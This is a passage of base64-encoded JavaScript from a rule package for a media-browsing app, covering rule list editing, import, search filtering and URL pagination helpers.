sICfph43mlrDmjpLluo8nLCAn5pu05pS55Zu+5qCHJywgJ+WvvOWFpea1t+mYlCddKS5mb3JFYWNoKCh2KSA9PiB7XFxuICAgIGVsLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IHYgPT0gZWRpdE1vZGUgPyAn4oCc4oCc4oCd4oCdJyArIHYuYm9sZCgpLmZvbnRjb2xvcignIzEyYjY2OCcpIDogdixcXG4gICAgICAgIHVybDogdiA9PSBlZGl0TW9kZSA/ICdoaWtlcjovL2VtcHR5JyA6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHYpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcignZWRpdE1vZGUnLCB2KVxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgIH0sIHYpLFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbiAgICB9KVxcbn0pO1xcbmlmIChlZGl0TW9kZSA9PSAn5a+85YWl5rW36ZiUJykgZWwucHVzaCh7XFxuICAgIHRpdGxlOiAn5YWo6YOo5a+85YWlJyxcXG4gICAgdXJsOiAn5rW36ZiU6KeG55WM77+laG9tZV9ydWxlX3VybO+/pScgKyAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgfHwgdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSA/IHVybCA6ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcycpLFxcbiAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcbiAgICBleHRyYTogeyBsaW5lVmlzaWJsZTogZmFsc2UgfVxcbn0pO1xcbihkaXNhYmxlQ3VzdG9tID8gZGF0YSA6IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKSkuZm9yRWFjaCgodiwgaSkgPT4ge1xcbiAgICBsZXQgZCA9IHsgdGl0bGU6IHYudGl0bGUsIGltZzogZGF0YVtpXS5pY29uIH1cXG4gICAgc3dpdGNoIChlZGl0TW9kZSkge1xcbiAgICAgICAgY2FzZSAn5ZCv55SoL+emgeeUqCc6XFxuICAgICAgICAgICAgZC50aXRsZSA9ICh2LnZpc2libGUgPyAn8J+foiAgJyA6ICfwn5S0ICAnKSArIGQudGl0bGVcXG4gICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxuICAgICAgICAgICAgICAgIHJ1bGVzW2ldLnZpc2libGUgPSAhcnVsZXNbaV0udmlzaWJsZVxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICBjYXNlICfph43mlrDmjpLluo8nOlxcbiAgICAgICAgICAgIGxldCBzb3J0RmxhZyA9IHBhcnNlSW50KGdldE15VmFyKCdzb3J0RmxhZycsICctMScpKVxcbiAgICAgICAgICAgIGQudGl0bGUgPSAoc29ydEZsYWcgPT0gaSA/ICfwn5SDICAnIDogJycpICsgZC50aXRsZVxcbiAgICAgICAgICAgIGlmIChzb3J0RmxhZyA9PSAtMSlcXG4gICAgICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignc29ydEZsYWcnLCBpLnRvU3RyaW5nKCkpXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/pgInmi6nopoHnp7vliqjliLDnmoTkvY3nva4nXFxuICAgICAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgZWxzZVxcbiAgICAgICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKG9sZEluZGV4LCBuZXdJbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpXFxuICAgICAgICAgICAgICAgICAgICBydWxlcy5zcGxpY2UobmV3SW5kZXgsIDAsIHJ1bGVzLnNwbGljZShvbGRJbmRleCwgMSlbMF0pXFxuICAgICAgICAgICAgICAgICAgICBzYXZlRmlsZSgnY3VzdG9tRGF0YScsIEpTT04uc3RyaW5naWZ5KHJ1bGVzKSlcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKCdzb3J0RmxhZycsICctMScpXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgICAgICAgICAgfSwgc29ydEZsYWcsIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgIGNhc2UgJ+abtOaUueWbvuaghyc6XFxuICAgICAgICAgICAgZC51cmwgPSAkKHYuaWNvbiB8fCAnJywgJ+i+k+WFpeaWsOWbvuagh+WcsOWdgOaIluminOiJsuS7o+egge+8micpLmlucHV0KChpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQpXFxuICAgICAgICAgICAgICAgICAgICBydWxlc1tpXS5pY29uID0gaW5wdXRcXG4gICAgICAgICAgICAgICAgZWxzZVxcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIHJ1bGVzW2ldLmljb25cXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICAgICAgY2FzZSAn5a+85YWl5rW36ZiUJzpcXG4gICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IGRhdGEgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBnZXRNeVZhcignbXlDb2xsZWN0aW9uJyksIHRydWUpXFxuICAgICAgICAgICAgICAgIHJldHVybiAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZGF0YVtpXSkpXFxuICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICB9XFxuICAgIGVsLnB1c2goZClcXG59KSovXFxuKGRpc2FibGVDdXN0b20gPyBbJ+WvvOWFpea1t+mYlCddIDogWyflkK/nlKgv56aB55SoJywgJ+mHjeaWsOaOkuW6jycsICfmm7TmlLnlm77moIcnLCAn5a+85YWl5rW36ZiUJ10pLmZvckVhY2goKHYpID0+IHtcXG4gICAgZWwucHVzaCh7XFxuICAgICAgICB0aXRsZTogdiA9PSBlZGl0TW9kZSA/ICfigJzigJzigJ3igJ0nICsgdi5ib2xkKCkuZm9udGNvbG9yKCcjMTJiNjY4JykgOiB2LFxcbiAgICAgICAgdXJsOiB2ID09IGVkaXRNb2RlID8gJ2hpa2VyOi8vZW1wdHknIDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodikgPT4ge1xcbiAgICAgICAgICAgIHB1dE15VmFyKCdlZGl0TW9kZScsIHYpXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgfSwgdiksXFxuICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxuICAgIH0pXFxufSk7XFxuaWYoZWRpdE1vZGUgPT09ICflr7zlhaXmtbfpmJQnKSB7XFxuICAgIGVsLnB1c2goe1xcbiAgICAgICAgdGl0bGU6J+aQnOe0oicsXFxuICAgICAgICBkZXNjOifovpPlhaXlsI/nqIvluo/moIfpoph85Zyw5Z2A6L+b6KGM5pCc57SiLi4uJyxcXG4gICAgICAgIHVybDokLnRvU3RyaW5nKCgpPT57XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgfSksXFxuICAgICAgICBjb2xfdHlwZTonaW5wdXQnLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBvbkNoYW5nZTogXFxcInB1dE15VmFyKCdpbXBvcnRTZWFyY2hLZXknLGlucHV0KVxcXCIsXFxuICAgICAgICAgICAgdGl0bGVWaXNpYmxlOiB0cnVlLFxcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTpnZXRNeVZhcignaW1wb3J0U2VhcmNoS2V5JywnJylcXG4gICAgICAgIH0sXFxuICAgIH0pO1xcbiAgICBlbC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn5YWo6YOo5a+85YWlKOmdnuaQnOe0oui/h+a7pOWQjue7k+aenCknLFxcbiAgICAgICAgdXJsOiAn5rW36ZiU6KeG55WM77+laG9tZV9ydWxlX3VybO+/pScgKyAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgfHwgdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSA/IHVybCA6ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcycpLFxcbiAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAgICAgIGV4dHJhOiB7bGluZVZpc2libGU6IGZhbHNlfVxcbiAgICB9KTtcXG59XFxudmFyIGRhdGFzID0gKGRpc2FibGVDdXN0b20gPyBkYXRhIDogSlNPTi5wYXJzZShyZWFkRmlsZSgnY3VzdG9tRGF0YScpIHx8ICdbXScpKTtcXG5sZXQgc2sgPSBnZXRNeVZhcignaW1wb3J0U2VhcmNoS2V5JywnJyk7XFxuaWYoZWRpdE1vZGUgPT09ICflr7zlhaXmtbfpmJQnJiZzaykge1xcbiAgICBkYXRhcyA9IGRhdGFzLmZpbHRlcihpdD0+aXQudGl0bGUuaW5jbHVkZXMoc2spfHwoaXQudXJsJiZpdC51cmwuaW5jbHVkZXMoc2spKSk7XFxuICAgIGRhdGEgPSBkYXRhLmZpbHRlcihpdD0+aXQudGl0bGUuaW5jbHVkZXMoc2spfHwoaXQudXJsJiZpdC51cmwuaW5jbHVkZXMoc2spKSk7XFxufVxcbmRhdGFzLmZvckVhY2goKHYsIGkpID0+IHtcXG4gICAgbGV0IGQgPSB7IHRpdGxlOiB2LnRpdGxlLCBpbWc6IGRhdGFbaV0uaWNvbiB9XFxuICAgIHN3aXRjaCAoZWRpdE1vZGUpIHtcXG4gICAgICAgIGNhc2UgJ+WQr+eUqC/npoHnlKgnOlxcbiAgICAgICAgICAgIGQudGl0bGUgPSAodi52aXNpYmxlID8gJ/Cfn6IgICcgOiAn8J+UtCAgJykgKyBkLnRpdGxlXFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICBydWxlc1tpXS52aXNpYmxlID0gIXJ1bGVzW2ldLnZpc2libGVcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICAgICAgY2FzZSAn6YeN5paw5o6S5bqPJzpcXG4gICAgICAgICAgICBsZXQgc29ydEZsYWcgPSBwYXJzZUludChnZXRNeVZhcignc29ydEZsYWcnLCAnLTEnKSlcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHNvcnRGbGFnID09IGkgPyAn8J+UgyAgJyA6ICcnKSArIGQudGl0bGVcXG4gICAgICAgICAgICBpZiAoc29ydEZsYWcgPT0gLTEpXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgaS50b1N0cmluZygpKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6YCJ5oup6KaB56e75Yqo5Yiw55qE5L2N572uJ1xcbiAgICAgICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGVsc2VcXG4gICAgICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChvbGRJbmRleCwgbmV3SW5kZXgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXMuc3BsaWNlKG5ld0luZGV4LCAwLCBydWxlcy5zcGxpY2Uob2xkSW5kZXgsIDEpWzBdKVxcbiAgICAgICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignc29ydEZsYWcnLCAnLTEnKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgICAgIH0sIHNvcnRGbGFnLCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICBjYXNlICfmm7TmlLnlm77moIcnOlxcbiAgICAgICAgICAgIGQudXJsID0gJCh2Lmljb24gfHwgJycsICfovpPlhaXmlrDlm77moIflnLDlnYDmiJbpopzoibLku6PnoIHvvJonKS5pbnB1dCgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0KVxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXNbaV0uaWNvbiA9IGlucHV0XFxuICAgICAgICAgICAgICAgIGVsc2VcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBydWxlc1tpXS5pY29uXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgIGNhc2UgJ+WvvOWFpea1t+mYlCc6XFxuICAgICAgICAgICAgZC51cmwgPSAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZGF0YVtpXSkpO1xcbiAgICAgICAgICAgIGJyZWFrXFxuICAgIH1cXG4gICAgZWwucHVzaChkKVxcbn0pXFxuc2V0UmVzdWx0KGVsKVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6ZO+5o6l5aSE55CGKlwiLFwicGF0aFwiOlwidXJsUGFyc2VcIixcInJ1bGVcIjpcIi8vIOmmlumhtemTvuaOpeabv+aNouWIhuexu1xcbmZ1bmN0aW9uIGluZGV4VXJsKHBhcmFtKSB7XFxuICAgIGZ1bmN0aW9uIHJ1bkNvZGUocnVsZSkge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBsZXQgW2lucHV0LCBjb2RlXSA9IHJ1bGUuc3BsaXQoJy5qczonKVxcbiAgICAgICAgICAgIHJldHVybiBjb2RlID8gZXZhbChjb2RlKSA6IHJ1bGVcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHsgcmV0dXJuIHJ1bGUgfVxcbiAgICB9XFxuICAgIGxldCB7IFJVTEUsIHBhZ2VOdW0sIFFJTkdfVElUTEUgfSA9IEpTT04ucGFyc2UocGFyYW0uc3BsaXQoJyMjIycpWzFdKVxcbiAgICBSVUxFID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoUlVMRSkpXFxuICAgIHBhZ2VOdW0gPSBwYXJzZUludChwYWdlTnVtKVxcbiAgICBsZXQgdXJsID0gUlVMRS51cmxcXG5cXG4gICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSkpLnJ1bGUpXFxuICAgIHVybCA9IHRhYkhlYWRlci5zZXRVcmwoZnlBbGwgPyB1cmwucmVwbGFjZSgvZnlBbGwvZywgJyQke2Z5QWxsfScpIDogdXJsLnJlcGxhY2UoL2Z5KGNsYXNzfGFyZWF8eWVhcnxzb3J0KS9nLCAnJCR7ZnkkMX0nKSlcXG4gICAgdXJsID0gdXJsLnJlcGxhY2UoL2Z5cGFnZSg/OkAoLT9cXFxcZCspQCk/KD86XFxcXCooXFxcXGQrKUApPy9nLCAoXywgc3RhcnQsIHNwYWNlKSA9PiBwYXJzZUludChzdGFydCB8fCAwKSArIDEgKyAocGFnZU51bSAtIDEpICogcGFyc2VJbnQoc3BhY2UgfHwgMSkpXFxuICAgIHVybCA9IC9eKFtcXFxcc1xcXFxTXSo/KSg/OlxcXFxbZmlyc3RQYWdlPShbXFxcXHNcXFxcU10qPylcXFxcXSk/KD86KFxcXFwuanM6W1xcXFxzXFxcXFNdKj8pKT8kLy5leGVjKHVybClcXG4gICAgaWYgKHBhZ2VOdW0gPT0gMSAmJiB1cmxbMl0pIHVybFsxXSA9IHVybFsyXVxcbiAgICBpZiAodXJsWzNdICYmICF1cmxbMV0uaW5jbHVkZXMoJy5qczonKSkgdXJsWzFdICs9IHVybFszXVxcbiAgICByZXR1cm4gcnVuQ29kZSh1cmxbMV0pXFxufVxcbmZ1bmN0aW9uIHBhcmFtSGFuZGxlKHVybFBhcmFtLCB1YSwgdXJsVG1wKSB7XFxuICAgIGxldCBjaGFyc2V0LCBwYXJhbVRtcFxcbiAgICB0cnkgeyAvLyDpk77mjqXnmoTnvJbnoIHjgIFVQeWSjFJlZmVyZXLlupTor6XmmK/pppblhYjnu6fmib/pppbpobXpk77mjqVcXG4gICAgICAgIFssICwgY2hhcnNldCwgcGFyYW1UbXBdID0gdXJsVG1wLnNwbGl0KCc7JylcXG4gICAgICAgIHBhcmFtVG1wID0gcGFyYW1UbXAubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXG4gICAgfSBjYXRjaCAoZSkgeyBwYXJhbVRtcCA9IFtdIH1cXG4gICAgbGV0IFVzZXJBZ2VudCA9IHBhcmFtVG1wLmZpbmQoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSksXFxuICAgICAgICBSZWZlcmVyID0gcGFyYW1UbXAuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKVxcbiAgICB1cmxQYXJhbVswXSA9IHVybFBhcmFtWzBdIHx8ICdHRVQnXFxuICAgIHVybFBhcmFtWzFdID0gdXJsUGFyYW1bMV0gfHwgY2hhcnNldCB8fCAnVVRGLTgnXFxuICAgIHRyeSB7XFxuICAgICAgICB1cmxQYXJhbVsyXSA9IHVybFBhcmFtWzJdLm1hdGNoKC9eeyguKil9JC8pWzFdLnNwbGl0KCcmJicpXFxuICAgIH0gY2F0Y2ggKGUpIHsgdXJsUGFyYW1bMl0gPSBbXSB9XFxuICAgIC8vIOa3u+WKoOWFqOWxgFVB5ZKM5LiK57qnUmVmZXJlclxcbiAgICBpZiAoIXVybFBhcmFtWzJdLnNvbWUoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSkpIHtcXG4gICAgICAgIGlmIChVc2VyQWdlbnQpIHVybFBhcmFtWzJdLnB1c2goVXNlckFnZW50KVxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ3BjJylcXG4gICAgICAgICAgICB1cmxQYXJhbVsyXS5wdXNoKCdVc2VyLUFnZW50QCcgKyBQQ19VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcPy8sICfvvJ/vvJ8nKSlcXG4gICAgICAgIGVsc2UgaWYgKHVhID09ICdtb2JpbGUnKVxcbiAgICAgICAgICAgIHVybFBhcmFtWzJdLnB1c2goJ1VzZXItQWdlbnRAJyArIE1PQklMRV9VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcPy8sICfvvJ/vvJ8nKSlcXG4gICAgfVxcbiAgICBpZiAoUmVmZXJlciAmJiAhdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKSlcXG4gICAgICAgIHVybFBhcmFtWzJdLnB1c2goUmVmZXJlcilcXG4gICAgdXJsUGFyYW1bMl0gPSAneycgKyB1cmxQYXJhbVsyXS5qb2luKCcmJicpICsgJ30nXFxuICAgIHJldHVybiB1cmxQYXJhbS5qb2luKCc7JylcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpk77mjqXlpITnkIZb5LqMXSpcIixcInBhdGhcIjpcInVybC1wcm9jZXNzb3JcIixcInJ1bGVcIjpcIi8qKlxcbiAqIOeggeS6kSBHaXRlZSDpk77mjqUgaHR0cHM6Ly9naXRodWIuamV2b25zLnZpcC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUVExOTkzSFVBTkcvWU1KL21haW4v6ZiF5Yqo5ryrLmpzb25cXG4gKi9cXG5mdW5jdGlvbiBVcmxQcm9jZXNzb3IoKSB7XFxuICAgIHRoaXMucGFyYW1zID0ge31cXG4gICAgdGhpcy5yZWdleE1hcCA9IFtcXG4gICAgICAgIHtcXG4gICAgICAgICAgICByZWc6ICcodm9kdHlwZXx2aWRlb3QpXFxcXFxcXFwvXFxcXFxcXFx3KycsXFxuICAgICAgICAgICAgZXhlYzogKCkgPT4ge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5wYXJhbXMudXJsXFxuICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvLVxcXFxkKy5odG1sLywgJy0nICsgdGhpcy5wYXJhbXMucGFnZSArICcuaHRtbCcpXFxuICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvKCh2b2R0eXBlfHZpZGVvdClcXFxcL1xcXFx3KykuaHRtbC8sICckMS0nICsgdGhpcy5wYXJhbXMucGFnZSArICcuaHRtbCcpXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSxcXG4gICAgICAgIHtcXG4gICAgICAgICAgICByZWc6ICdcXFxcXFxcXC8/W1xcXFxcXFxcd1xcXFxcXFxcZF0rLS4qPy0uKj8tLio/LS4qPy0uKj8tLio/LS4qPy1cXFxcXFxcXGQqLS0tXFxcXFxcXFxkKi5odG1sJyxcXG4gICAgICAgICAgICBleGVjOiAoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLnBhcmFtcy51cmxcXG4gICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC9cXFxcZCooLS0tLmh0bWwpLywgdGhpcy5wYXJhbXMucGFnZSArICckMScpXFxuICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvKC0tLVxcXFxkKy5odG1sKS8sIHRoaXMucGFyYW1zLnBhZ2UgKyAnJDEnKTsgLy8g5ou85o6l6aG156CBXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSxcXG4gICAgICAgIHtcXG4gICAgICAgICAgICByZWc6ICcoKFxcXFxcXFxcL3ZvZFxcXFxcXFxcL3Nob3cpPyhcXFxcXFxcXC9hcmVhXFxcXFxcXFwvW1xcXFxcXFxcd1xcXFxcXFxcZCVdKyk/KFxcXFxcXFxcL2J5XFxcXFxcXFwvW1xcXFxcXFxcd1xcXFxcXFxcZCVdKyk/KFxcXFxcXFxcL2lkXFxcXFxcXFwvXFxcXFxcXFxkKyk/KFxcXFxcXFxcL2xldHRlclxcXFxcXFxcL1tcXFxcXFxcXHdcXFxcXFxcXGQlXSspPykoXFxcXFxcXFwvcGFnZVxcXFxcXFxcL1xcXFxcXFxcZCspPyhcXFxcXFxcXC95ZWFyXFxcXFxcXFwvXFxcXFxcXFxkKyk/XFxcXFxcXFwuaHRtbCcsXFxuICAgICAgICAgICAgZXhlYzogKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcmVnRXhwID0gLygoXFxcXC92b2RcXFxcL3Nob3cpPyhcXFxcL2FyZWFcXFxcL1tcXFxcd1xcXFxkJV0rKT8oXFxcXC9ieVxcXFwvW1xcXFx3XFxcXGQlXSspPyhcXFxcL2lkXFxcXC9cXFxcZCspPyhcXFxcL2xldHRlclxcXFwvW1xcXFx3XFxcXGQlXSspPykoXFxcXC9wYWdlXFxcXC9cXFxcZCspPyhcXFxcL3llYXJcXFxcL1xcXFxkKyk/XFxcXC5odG1sL1xcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5wYXJhbXMudXJsXFxuICAgICAgICAgICAgICAgICAgICAucmVwbGFjZShyZWdFeHAsICckMScgKyAoXFxcIi9wYWdlL1xcXCIgKyB0aGlzLnBhcmFtcy5wYWdlKSArICckOCcgKyBcXFwiLmh0bWxcXFwiKVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgXVxcbn1cXG5cXG5PYmplY3QuYXNzaWduKFVybFByb2Nlc3Nvci5wcm90b3R5cGUsIHtcXG4gICAgY29uc3RydWN0b3I6IFVybFByb2Nlc3NvcixcXG4gICAgY2hlY2tQYXJhbXMoKSB7XFxuICAgICAgICBpZiAoIXRoaXMucGFyYW1zLnVybCkge1xcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi6K+35YWI6LCD55SoIC5iYXNlVXJsKHVybCkg5Lyg5YWl6ZO+5o6l6L+b6KGM5Yid5aeL5YyWIVxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICBpZiAoIXRoaXMucGFyYW1zLnBhZ2UpIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuivt+WFiOiwg+eUqCAucGFnZShwYWdlKSDkvKDlhaXpobXnoIHov5vooYzliJ3lp4vljJYhXFxcIilcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAgYmFzZVVybCh1cmwpe1xcbiAgICAgICAgdGhpcy5wYXJhbXMudXJsID0gdXJsXFxuICAgICAgICByZXR1cm4gdGhpc1xcbiAgICB9LFxcbiAgICBwYWdlKHBhZ2Upe1xcbiAgICAgICAgdGhpcy5wYXJhbXMucGFnZSA9IHBhZ2VcXG4gICAgICAgIHJldHVybiB0aGlzXFxuICAgIH0sXFxuICAgIGFkZEV4dHJhKHJlZ0V4cCkge1xcbiAgICAgICAgaWYgKHJlZ0V4cC5jb25zdHJ1Y3RvciA9PT0gQXJyYXkpIHtcXG4gICAgICAgICAgICB0aGlzLnJlZ2V4TWFwID0gdGhpcy5yZWdleE1hcC5jb25jYXQocmVnRXhwKVxcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICB0aGlzLnJlZ2V4TWFwLnB1c2gocmVnRXhwKVxcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIHRoaXM7XFxuICAgIH0sXFxuICAgIGRlYnVnKCkge1xcbiAgICAgICAgdGhpcy5wYXJhbXMuZGVidWcgPSB0cnVlXFxuICAgICAgICByZXR1cm4gdGhpcztcXG4gICAgfSxcXG4gICAgZXhlYygpIHtcXG4gICAgICAgIHRoaXMuY2hlY2tQYXJhbXMoKVxcbiAgICAgICAgbGV0IHRydWVfdXJsID0gJydcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdGhpcy5yZWdleE1hcC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgIGxldCByZWdPYmogPSB0aGlzLnJlZ2V4TWFwW2ldO1